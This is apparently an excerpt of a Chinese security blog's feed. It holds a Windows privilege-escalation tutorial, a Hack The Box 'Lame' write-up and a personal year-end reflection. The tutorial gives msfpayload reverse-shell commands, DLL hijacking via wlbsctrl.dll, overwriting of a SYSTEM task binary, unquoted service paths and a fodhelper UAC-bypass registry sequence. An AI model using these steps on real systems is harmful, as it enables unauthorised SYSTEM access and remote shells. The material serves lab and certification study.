FILE_ALL_ACCESS</span><br><span class="line">  R  BUILTIN\Users</span><br><span class="line">        FILE_LIST_DIRECTORY</span><br><span class="line">        FILE_READ_ATTRIBUTES</span><br><span class="line">        FILE_READ_EA</span><br><span class="line">        FILE_TRAVERSE</span><br><span class="line">        SYNCHRONIZE</span><br><span class="line">        READ_CONTROL</span><br><span class="line">  RW NT AUTHORITY\Authenticated Users</span><br><span class="line">        FILE_ADD_FILE</span><br><span class="line">        FILE_ADD_SUBDIRECTORY</span><br><span class="line">        FILE_LIST_DIRECTORY</span><br><span class="line">        FILE_READ_ATTRIBUTES</span><br><span class="line">        FILE_READ_EA</span><br><span class="line">        FILE_TRAVERSE</span><br><span class="line">        FILE_WRITE_ATTRIBUTES</span><br><span class="line">        FILE_WRITE_EA</span><br><span class="line">        DELETE</span><br><span class="line">        SYNCHRONIZE</span><br><span class="line">        READ_CONTROL</span><br><span class="line"></span><br><span class="line">C:\Users\user1\Desktop&gt; cacls &quot;C:\Python27&quot;</span><br><span class="line"></span><br><span class="line">C:\Python27 BUILTIN\Administrators:(ID)F</span><br><span class="line">            BUILTIN\Administrators:(OI)(CI)(IO)(ID)F</span><br><span class="line">            NT AUTHORITY\SYSTEM:(ID)F</span><br><span class="line">            NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(ID)F</span><br><span class="line">            BUILTIN\Users:(OI)(CI)(ID)R</span><br><span class="line">            NT AUTHORITY\Authenticated Users:(ID)C</span><br><span class="line">            NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(ID)C</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Before we go over to action we need to check the status of the IKEEXT service. In this case we can see it is set to &quot;</span>AUTO_START<span class="string">&quot; so it will launch on boot!</span></span></span><br><span class="line"></span><br><span class="line">C:\Users\user1\Desktop&gt; sc qc IKEEXT</span><br><span class="line"></span><br><span class="line">[SC] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: IKEEXT</span><br><span class="line">        TYPE               : 20  WIN32_SHARE_PROCESS</span><br><span class="line">        START_TYPE         : 2   AUTO_START</span><br><span class="line">        ERROR_CONTROL      : 1   NORMAL</span><br><span class="line">        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k netsvcs</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : IKE and AuthIP IPsec Keying Modules</span><br><span class="line">        DEPENDENCIES       : BFE</span><br><span class="line">        SERVICE_START_NAME : LocalSystem</span><br></pre></td></tr></table></figure><p>生成恶意 DLL 并反弹 shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@darkside:~# msfpayload windows/shell_reverse_tcp lhost=&#x27;127.0.0.1&#x27; lport=&#x27;9988&#x27; O</span><br><span class="line">root@darkside:~# msfpayload windows/shell_reverse_tcp lhost=&#x27;127.0.0.1&#x27; lport=&#x27;9988&#x27; D &gt; </span><br><span class="line">/root/Desktop/evil.dll</span><br></pre></td></tr></table></figure><p>将 DLL 传输到目标计算机后，我们需要做的就是将其重命名为 wlbsctrl.dll 并将其移动到“C:\Python27”，然后等待机器重新启动（或者可以尝试强制重新启动），将获得一个 SYSTEM shell。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Again, this is as low privilege user1.</span></span><br><span class="line"></span><br><span class="line">C:\Users\user1\Desktop&gt; dir</span><br><span class="line"></span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is 948D-A98F</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\user1\Desktop</span><br><span class="line"></span><br><span class="line">02/18/2014  01:49 PM    &lt;DIR&gt;          .</span><br><span class="line">02/18/2014  01:49 PM    &lt;DIR&gt;          ..</span><br><span class="line">04/22/2013  09:39 AM           331,888 accesschk.exe</span><br><span class="line">02/18/2014  12:38 PM            14,336 evil.dll</span><br><span class="line">01/25/2014  12:46 AM            36,864 fubar.exe</span><br><span class="line">01/22/2014  08:17 AM    &lt;DIR&gt;          incognito2</span><br><span class="line">06/30/2011  01:52 PM         1,667,584 ncat.exe</span><br><span class="line">11/22/2013  07:39 PM             1,225 wmic_info.bat</span><br><span class="line">               5 File(s)      2,051,897 bytes</span><br><span class="line">               3 Dir(s)      73,052,160 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\user1\Desktop&gt; copy evil.dll C:\Python27\wlbsctrl.dll</span><br><span class="line"></span><br><span class="line">        1 file(s) copied.</span><br><span class="line"></span><br><span class="line">C:\Users\user1\Desktop&gt; dir C:\Python27</span><br><span class="line"></span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is 948D-A98F</span><br><span class="line"></span><br><span class="line"> Directory of C:\Python27</span><br><span class="line"></span><br><span class="line">02/18/2014  01:53 PM    &lt;DIR&gt;          .</span><br><span class="line">02/18/2014  01:53 PM    &lt;DIR&gt;          ..</span><br><span class="line">10/20/2012  02:52 AM    &lt;DIR&gt;          DLLs</span><br><span class="line">10/20/2012  02:52 AM    &lt;DIR&gt;          Doc</span><br><span class="line">10/20/2012  02:52 AM    &lt;DIR&gt;          include</span><br><span class="line">01/28/2014  03:45 AM    &lt;DIR&gt;          Lib</span><br><span class="line">10/20/2012  02:52 AM    &lt;DIR&gt;          libs</span><br><span class="line">04/10/2012  11:34 PM            40,092 LICENSE.txt</span><br><span class="line">04/10/2012  11:18 PM           310,875 NEWS.txt</span><br><span class="line">04/10/2012  11:31 PM            26,624 python.exe</span><br><span class="line">04/10/2012  11:31 PM            27,136 pythonw.exe</span><br><span class="line">04/10/2012  11:18 PM            54,973 README.txt</span><br><span class="line">10/20/2012  02:52 AM    &lt;DIR&gt;          tcl</span><br><span class="line">10/20/2012  02:52 AM    &lt;DIR&gt;          Tools</span><br><span class="line">04/10/2012  11:31 PM            49,664 w9xpopen.exe</span><br><span class="line">02/18/2014  12:38 PM            14,336 wlbsctrl.dll</span><br><span class="line">               7 File(s)        523,700 bytes</span><br><span class="line">               9 Dir(s)      73,035,776 bytes free</span><br></pre></td></tr></table></figure><h3 id="Demo2"><a href="#Demo2" class="headerlink" title="Demo2"></a>Demo2</h3><p>目标主机运行了TFTP 客户端，它正在连接到远程主机并抓取某种日志文件。 我们可以看到该任务每天上午 9 点运行，并且以系统级权限运行。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">HostName:                             B33F</span><br><span class="line">TaskName:                             \LogGrabberTFTP</span><br><span class="line">Next Run Time:                        2/19/2014 9:00:00 AM</span><br><span class="line">Status:                               Ready</span><br><span class="line">Logon Mode:                           Interactive/Background</span><br><span class="line">Last Run Time:                        N/A</span><br><span class="line">Last Result:                          1</span><br><span class="line">Author:                               B33F\b33f</span><br><span class="line">Task To Run:                          E:\GrabLogs\tftp.exe 10.1.1.99 GET log.out E:\GrabLogs\Logs\log.txt</span><br><span class="line">Start In:                             N/A</span><br><span class="line">Comment:                              N/A</span><br><span class="line">Scheduled Task State:                 Enabled</span><br><span class="line">Idle Time:                            Disabled</span><br><span class="line">Power Management:                     Stop On Battery Mode, No Start On Batteries</span><br><span class="line">Run As User:                          SYSTEM</span><br><span class="line">Delete Task If Not Rescheduled:       Enabled</span><br><span class="line">Stop Task If Runs X Hours and X Mins: 72:00:00</span><br><span class="line">Schedule:                             Scheduling data is not available in this format.</span><br><span class="line">Schedule Type:                        Daily</span><br><span class="line">Start Time:                           9:00:00 AM</span><br><span class="line">Start Date:                           2/17/2014</span><br><span class="line">End Date:                             N/A</span><br><span class="line">Days:                                 Every 1 day(s)</span><br><span class="line">Months:                               N/A</span><br><span class="line">Repeat: Every:                        Disabled</span><br><span class="line">Repeat: Until: Time:                  Disabled</span><br><span class="line">Repeat: Until: Duration:              Disabled</span><br><span class="line">Repeat: Stop If Still Running:        Disabled</span><br></pre></td></tr></table></figure><p>先检查攻击者是否有这个文件夹的写权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\user1\Desktop&gt; accesschk.exe -dqv &quot;E:\GrabLogs&quot;</span><br><span class="line"></span><br><span class="line">E:\GrabLogs</span><br><span class="line">  Medium Mandatory Level (Default) [No-Write-Up]</span><br><span class="line">  RW BUILTIN\Administrators</span><br><span class="line">        FILE_ALL_ACCESS</span><br><span class="line">  RW NT AUTHORITY\SYSTEM</span><br><span class="line">        FILE_ALL_ACCESS</span><br><span class="line">  RW NT AUTHORITY\Authenticated Users</span><br><span class="line">        FILE_ADD_FILE</span><br><span class="line">        FILE_ADD_SUBDIRECTORY</span><br><span class="line">        FILE_LIST_DIRECTORY</span><br><span class="line">        FILE_READ_ATTRIBUTES</span><br><span class="line">        FILE_READ_EA</span><br><span class="line">        FILE_TRAVERSE</span><br><span class="line">        FILE_WRITE_ATTRIBUTES</span><br><span class="line">        FILE_WRITE_EA</span><br><span class="line">        DELETE</span><br><span class="line">        SYNCHRONIZE</span><br><span class="line">        READ_CONTROL</span><br><span class="line">  R  BUILTIN\Users</span><br><span class="line">        FILE_LIST_DIRECTORY</span><br><span class="line">        FILE_READ_ATTRIBUTES</span><br><span class="line">        FILE_READ_EA</span><br><span class="line">        FILE_TRAVERSE</span><br><span class="line">        SYNCHRONIZE</span><br><span class="line">        READ_CONTROL</span><br><span class="line"></span><br><span class="line">C:\Users\user1\Desktop&gt; dir &quot;E:\GrabLogs&quot;</span><br><span class="line"></span><br><span class="line"> Volume in drive E is More</span><br><span class="line"> Volume Serial Number is FD53-2F00</span><br><span class="line"></span><br><span class="line"> Directory of E:\GrabLogs</span><br><span class="line"></span><br><span class="line">02/18/2014  11:34 PM    &lt;DIR&gt;          .</span><br><span class="line">02/18/2014  11:34 PM    &lt;DIR&gt;          ..</span><br><span class="line">02/18/2014  11:34 PM    &lt;DIR&gt;          Logs</span><br><span class="line">02/18/2014  09:21 PM           180,736 tftp.exe</span><br><span class="line">               1 File(s)        180,736 bytes</span><br><span class="line">               3 Dir(s)   5,454,602,240 bytes free</span><br></pre></td></tr></table></figure><p>任何经过身份验证的用户都具有对该文件夹的写访问权限，使用 Metasploit 生成后门文件覆盖原有的二进制文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@darkside:~# msfpayload windows/shell_reverse_tcp lhost=&#x27;127.0.0.1&#x27; lport=&#x27;9988&#x27; O</span><br><span class="line">root@darkside:~# msfpayload windows/shell_reverse_tcp lhost=&#x27;127.0.0.1&#x27; lport=&#x27;9988&#x27; R | msfencode -t exe &gt; /root/Desktop/evil-tftp.exe</span><br></pre></td></tr></table></figure><p>上传恶意可执行文件并覆盖“E:\GrabLogs\tftp.exe”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\user1\Desktop&gt; dir</span><br><span class="line"></span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is 948D-A98F</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\user1\Desktop</span><br><span class="line"></span><br><span class="line">02/19/2014  01:36 AM    &lt;DIR&gt;          .</span><br><span class="line">02/19/2014  01:36 AM    &lt;DIR&gt;          ..</span><br><span class="line">04/22/2013  09:39 AM           331,888 accesschk.exe</span><br><span class="line">02/19/2014  01:31 AM            73,802 evil-tftp.exe</span><br><span class="line">01/25/2014  12:46 AM            36,864 fubar.exe</span><br><span class="line">01/22/2014  08:17 AM    &lt;DIR&gt;          incognito2</span><br><span class="line">06/30/2011  01:52 PM         1,667,584 ncat.exe</span><br><span class="line">02/18/2014  12:38 PM            14,336 wlbsctrl.dll</span><br><span class="line">11/22/2013  07:39 PM             1,225 wmic_info.bat</span><br><span class="line">               6 File(s)      2,125,699 bytes</span><br><span class="line">               3 Dir(s)      75,341,824 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\user1\Desktop&gt; copy evil-tftp.exe E:\GrabLogs\tftp.exe</span><br><span class="line"></span><br><span class="line">Overwrite E:\GrabLogs\tftp.exe? (Yes/No/All): Yes</span><br><span class="line">        1 file(s) copied.</span><br></pre></td></tr></table></figure><h3 id="Demo3"><a href="#Demo3" class="headerlink" title="Demo3"></a>Demo3</h3><p>以SYSTEM运行的服务程序，若文件系统权限允许任何人修改，则可利用提权。</p><p>查询所有服务进程路径（Program Files路径表示是用户安装的服务)</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#power shell command</span></span><br><span class="line"><span class="built_in">Get-WmiObject</span> win32_service | <span class="built_in">Select-Object</span> Name,State,PathName | <span class="built_in">Where-Object</span>&#123;<span class="variable">$_</span>.State <span class="operator">-like</span> <span class="string">&#x27;Running&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><p>主要关注启动的服务的路径，如果路径中有空格，那么路径必须包含在双引号内</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Name                           State   PathName</span><br><span class="line"></span><br><span class="line">----                           -----   --------</span><br><span class="line"></span><br><span class="line">AMD Crash Defender Service     Running C:\WINDOWS\System32\amdfendrsr.exe</span><br><span class="line">WdNisSvc                       Running &quot;C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24020.7-0\NisSrv.exe&quot;</span><br></pre></td></tr></table></figure><p>如果有一个路径有空格，但是不在双引号内，这就有可能用来提权</p><p>需要满足几个条件，首先该服务要以高权限运行，其次某一级路径要可写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Common Files\VMware\USB\vmware-usbarbitrator64.exe</span><br><span class="line">操作系统在解析这个路径的时候，就会先检查C盘下有没有一个C:\Program.exe的文件，如果有那么就执行</span><br><span class="line">C:\Program.exe Files\Common Files\VMware\USB\vmware-usbarbitrator64.exe</span><br><span class="line">后面的就会被当成参数</span><br><span class="line"></span><br><span class="line">如果C盘根目录下无写入权限，那么就可以在C:\Program Files\下写入一个Common.exe后门，执行</span><br><span class="line">C:\Program.exe Files\Common.exe Files\VMware\USB\vmware-usbarbitrator64.exe</span><br><span class="line"></span><br><span class="line">其余同理</span><br><span class="line">或者vmware-usbarbitrator64.exe我们有改写的权限，那更直接了</span><br><span class="line">查看文件权限</span><br><span class="line">icacls &quot;C:\Program Files\Common Files\VMware\USB\vmware-usbarbitrator64.exe&quot;</span><br></pre></td></tr></table></figure><h2 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h2><p>简单来说就是平时安装可执行文件的时候，会弹一个窗，是否确定运行。一个administrator组的用户都有两个令牌，一个是管理员权限的令牌，一个是普通用户权限的令牌，UAC就是临时切换到管理员权限下的令牌，比如在普通用户运行cmd和管理员权限运行cmd的时候查看user，返回的都是普通用户。</p><p>允许管理员用户通过静默方式将完整性级别从中等提升到高，绕过UAC大多数UAC绕过技术都只针对特定版本(Win10 build 1709)，包括部分18.x,19.x的win10</p><p>fodhelper.exe用于修改操作系统语言设置，默认运行于高完整性级别，无需管理员权限即可修改注册表项，实现以高完整性级别运行程序。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">设置=&gt;系统=&gt;应用和功能=&gt;管理可选功能(C:IWindowslSystem32lfodhelper.exe)</span><br></pre></td></tr></table></figure><p>使用sigcheck查看fodhelper.exe的manifest</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sigcheck.exe -a -m c:\windows\system32\fodhelper.exe</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">security</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">requestedPrivileges</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">requestedExecutionLevel</span></span></span><br><span class="line"><span class="tag"><span class="attr">level</span>=<span class="string">&quot;requireAdministrator&quot;</span></span></span><br><span class="line"><span class="tag">/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">requestedPrivileges</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">security</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">trustInfo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">asmv3</span> <span class="attr">:application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">asmv3:windowsSettings</span> <span class="attr">xm1ns</span>=<span class="string">&quot;http://schemas.microsoft.com/SMI/2005/WindowsSettings&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dpiAware</span>&gt;</span>true<span class="tag">&lt;/<span class="name">dpiAware</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">autoElevate</span>&gt;</span>true<span class="tag">&lt;/<span class="name">autoElevate</span>&gt;</span></span><br><span class="line">&lt;/asmv3: windowsSettings&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">asmv3:application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">assembly</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="绕过UAC提权"><a href="#绕过UAC提权" class="headerlink" title="绕过UAC提权"></a>绕过UAC提权</h3><p>我们无权修改任意注册表项，因此过滤当前用户可读写的 HKEY_CURRENT_USER</p><p>发现 fodhelper.exe尝试访问HKCU:\Software\Classes\ms-settings\shell\open\command 键值（不存在)，手动添加此注册表键</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\admin&gt; REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command</span><br></pre></td></tr></table></figure><p>同上的方法，查看fodhelper.exe尝试访问的注册表键，再添加两个注册表项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\admin&gt; REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ</span><br><span class="line"></span><br><span class="line">C:\Users\admin&gt; REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d &quot;cmd.exe&quot; /f</span><br></pre></td></tr></table></figure><p>再次执行fodhelper.exe，就会弹出管理员的cmd窗口</p><h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 首次执行任何 sysinternals 工具时，用户将看到一个 GUI 弹出窗口以接受 EULA，可以用如下参数绕过（第一次执行需要加该参数）</span><br><span class="line"></span><br><span class="line">accesschk.exe /accepteula ... ... ...</span><br><span class="line"></span><br><span class="line"># Find all weak folder permissions per drive.</span><br><span class="line">accesschk.exe -uwdqs Users c:\</span><br><span class="line">accesschk.exe -uwdqs &quot;Authenticated Users&quot; c:\</span><br><span class="line"></span><br><span class="line"># Find all weak file permissions per drive.</span><br><span class="line">accesschk.exe -uwqs Users c:\*.*</span><br><span class="line">accesschk.exe -uwqs &quot;Authenticated Users&quot; c:\*.*</span><br></pre></td></tr></table></figure><p>可以用sysinternals 工具中的process monitor(Procmon64)查看exe加载了哪些dll</p>]]></content>
      
      
      
        <tags>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSCPStudy-HTB-Lame</title>
      <link href="/2024/03/31/HTB-Lame/"/>
      <url>/2024/03/31/HTB-Lame/</url>
      
        <content type="html"><![CDATA[<p>目标IP地址10.10.10.3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">21/tcp   open  ftp         vsftpd 2.3.4</span><br><span class="line">22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))</span><br></pre></td></tr></table></figure><p>先试一下ftp能不能匿名登录，能匿名登录但是服务器下面没有文件</p><p>samba此版本下存在一个CVE-2007-2447漏洞，找到利用脚本，然后拿到一个shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/amriunix/CVE-2007-2447</span><br></pre></td></tr></table></figure><p>竟然直接就是root</p><p><a href="https://smms.app/image/V5trOUGCdlBQj9s" target="_blank"><img src="https://s2.loli.net/2024/03/31/V5trOUGCdlBQj9s.png" ></a></p><p>拿到root flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0dxxx</span><br></pre></td></tr></table></figure><p>在home目录下找到普通用户的flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">75xxx</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> OSCPStudy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的2023总结</title>
      <link href="/2024/03/31/%E6%88%91%E7%9A%842023%E6%80%BB%E7%BB%93/"/>
      <url>/2024/03/31/%E6%88%91%E7%9A%842023%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>想等到security的认证考过了再总结一下吧，现在既然认证已经拿到了，就大概絮叨絮叨，2023年大概是我至今以来目前精神内耗最严重的一年，先是年初跟领导提了想调动，然后被拿捏着去无锡代职，毕竟有了诉求，那就不好跟领导提不想去代职，一呆就是半年，那半年真是卷到起飞，工作日加四天班，周六还得加一天班，没有加班费的那种。无锡那个单位的各方面条件也很差，我住在一楼，宿舍是上世纪九十年代的那种老房子，潮湿不堪，两个人挤在一个十多平的小屋里，窗外的空调噪声巨大，经常大半夜弄的睡不着觉。那段时间被整的很焦虑，一边是调动的事迟迟悬而未决，一边是日复一日的加班，感觉自己就像拉磨的骡子，被吊在眼前的胡萝卜牵着走，躁郁的时候，自己就写写字，也算是把荒废了近十年的一点唯一勉强能称之为特长的手艺给捡了起来，“以后离职了说不定能去兼职带个书法班啥的”当时的我这样自嘲道。</p><p>四月去的无锡，十月才返回北京，然后国庆参加了我最好兄弟的婚礼，感觉一晃十多年过去了，看着别人都成家立业了，自己还是孤身一人飘零如风中柳絮，要说心里没有落差那是不可能的。国庆回去的时候，发现曾经的初中已经搬迁了，旧址被政府计划成一个景点，我心中不以为然，再次重履旧地，锈迹斑斑的篮球架、半米高的杂草、空无一人的凌乱教室，我看着十三年前的那个座位，午后的阳光透过窗户洒在斑驳的墙上，就想起金庸的一句词“红颜弹指老，刹那芳华”，人无法同时拥有青春和对青春的感受，此言不虚，有些东西是再也无法回来了。</p><p>回北京以后，领导提出来想让我去机关干一段时间，有个哥们转岗了，让我顶几个月，并告诉我单位马上要调整了，看能不能找机会把我调动的事解决了，我掂量了掂量既然已经是骑虎难下，那就干吧，投桃报李，想让领导报李，自己不交个投名状哪行呢。于是是焦头烂额地忙到了春节，那段时间基本上技术算是半荒废状态，加班基本上是连轴转，每周要写六份汇报，我跟同事调侃“用形式主义反对形式主义，每周不是在写报告就是在准备素材写报告”。</p><p>春节后，单位调整了，原来的那位领导调走了，走之前他说“调动的事给你联系过了，但是那边的单位说暂时没位置，再等等吧”，经过几个月行政口的经验，这话的弦外之音的意思就是基本上这事以他的层面他算是管不了了。原先年前自己也提前跟用人单位接触过，当时那里表示问题不大，结果年后我再联系的时候，得到的答复也是再等等，因为如果一件事，是真的想帮你办的话，哪怕短时间内办不了，也会说“先等等，下次有个什么什么机会，你关注一下”，而不是只说“再等等”。</p><p>春节休假结束之后，跟新领导提出来想回去干业务，批准了。有那么几天状态很差，毕竟是翘首以盼了一年的调动，最后黄了，要说一点失落没有那是不可能的，但是生活里理想丰满美好、现实一地鸡毛的事情多了去了，自己也只能选择接受或者被迫接受，人有时候得和自己和解。</p><p>回归技术工作之后也是逐渐把手艺拾起来了，其实做网络安全行业的，我也大可不必指着别人赏饭吃，做技术就把技术做好，国际通用的行业，到哪我也饿不着。陆续拿了2个CVE和一些CNVD，并不是拿这些漏洞编号有啥用，个人感觉自己已经过了刷编号的阶段了，只是纯粹检验一下技术还没有完全荒废。</p><p>3月底顺利通过security+的认证，开始准备今年最大的目标，OSCP国际渗透测试专家认证，这也是今年的第二个目标，等这个结了就准备考驾照，大概24年的规划就这三个证书，如果时间充裕，初步计划把OSEP也纳入日程。</p><p>最后，我引用《死亡诗社》里的一句台词，“梭罗曾说’多数人都生活在平静的绝望中，不要逆来顺受，要破茧而出’”，“虽然医药、法律、商业、工程，都是高尚的人生目标，但追求诗意与美、浪漫与爱，却是我们活着的意义”。</p><p>以上。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Experience </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个月时间通过ComptiaSecurity+认证的经验</title>
